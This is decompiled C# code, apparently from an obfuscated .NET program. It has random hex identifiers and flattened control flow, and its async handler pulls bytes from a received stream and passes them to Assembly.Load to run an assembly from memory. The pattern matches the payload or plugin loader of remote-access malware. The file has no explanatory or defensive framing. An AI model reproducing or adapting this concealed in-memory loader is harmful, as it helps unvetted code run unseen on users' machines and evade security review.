using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

internal static class DD80A734C57C4EAA
{
	[StructLayout(LayoutKind.Auto)]
	[CompilerGenerated]
	private struct _261B883009D54C5F : IAsyncStateMachine
	{
		public int B788A0787FFA41E1;

		public AsyncTaskMethodBuilder _58436D5320444CEB;

		public string _8A86D68F149A4FF9;

		public A24F37B85A5745EF _247E2EC975DA406A;

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void MoveNext()
		{
			int num = B788A0787FFA41E1;
			try
			{
				string[] array = BE999749FDB34AD6((object)_8A86D68F149A4FF9, (char)_003CModule_003E._8B9C7B12B1AE4949<int>(-1377793529), (StringSplitOptions)_003CModule_003E._390073C602714496<int>(2131963235));
				_ = array[_003CModule_003E.F84FA79ABE6944BB<int>(1398637845)];
				_ = array[_003CModule_003E._390073C602714496<int>(-250964212)];
				byte[] array2 = _1931ED08C0A94A35(B413624D364B46CE(_031FEFE002C94D5D((object)_247E2EC975DA406A)));
				try
				{
					FE826028047C43F7(array2);
				}
				finally
				{
					if (num < _003CModule_003E._58ECCB512F2A43AC<int>(352679804))
					{
						while (true)
						{
							IL_007b:
							int num2 = 570197493;
							while (true)
							{
								int num3 = num2;
								uint num4;
								switch ((num4 = (uint)(~(-(-(unchecked(-401720945 * -548285819) - ((num3 * -576464215) ^ (-(~(~471197645 - (147320641 + -681558453) - -2026701131)) + (1778507961 - -(2066231606 + --209739356) + (unchecked(-1609902589 * (-417241130 + 1785038445)) - ~(723558222 + -122211129) + 1004732809 * -unchecked(1620034558 - -528552464)))))) ^ 0x4C4EC3FE) ^ -1680644907))) % 3)
								{
								case 2u:
									break;
								default:
									goto end_IL_0080;
								case 1u:
									goto IL_0131;
								case 0u:
									goto end_IL_0080;
								}
								goto IL_007b;
								IL_0131:
								DE61C38253A148F2(B413624D364B46CE(_031FEFE002C94D5D((object)_247E2EC975DA406A)));
								num2 = ((int)num4 * -1904538007) ^ 0x20283960;
								continue;
								end_IL_0080:
								break;
							}
							break;
						}
					}
				}
			}
			catch (Exception exception)
			{
				B788A0787FFA41E1 = _003CModule_003E.F84FA79ABE6944BB<int>(1456819737);
				_58436D5320444CEB.SetException(exception);
				return;
			}
			B788A0787FFA41E1 = _003CModule_003E._3F57E81A62734AC2<int>(765599498);
			_58436D5320444CEB.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine stateMachine)
		{
			_58436D5320444CEB.SetStateMachine(stateMachine);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(stateMachine);
		}

		static string[] BE999749FDB34AD6(object P_0, char P_1, StringSplitOptions P_2)
		{
			return ((string)P_0).Split(P_1, P_2);
		}

		static object _031FEFE002C94D5D(object P_0)
		{
			return ((A24F37B85A5745EF)P_0).E5416C55D0A342A9;
		}

		static object B413624D364B46CE(object P_0)
		{
			return ((_92E045C44FAC46F3)P_0)._626F75DE2391436C;
		}

		static byte[] _1931ED08C0A94A35(object P_0)
		{
			return ((MemoryStream)P_0).ToArray();
		}

		static object FE826028047C43F7(byte[] P_0)
		{
			return Assembly.Load(P_0);
		}

		static void DE61C38253A148F2(object P_0)
		{
			((Stream)P_0).Dispose();
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(_261B883009D54C5F))]
	internal static Task _9B5654B6E21D4F53(_02C54685DE0E4B81 P_0, string P_1, A24F37B85A5745EF P_2)
	{
		_261B883009D54C5F stateMachine = default;
		stateMachine._58436D5320444CEB = AsyncTaskMethodBuilder.Create();
		stateMachine._8A86D68F149A4FF9 = P_1;
		stateMachine._247E2EC975DA406A = P_2;
		stateMachine.B788A0787FFA41E1 = _003CModule_003E._8B9C7B12B1AE4949<int>(-1251336224);
		stateMachine._58436D5320444CEB.Start(ref stateMachine);
		return stateMachine._58436D5320444CEB.Task;
	}
}
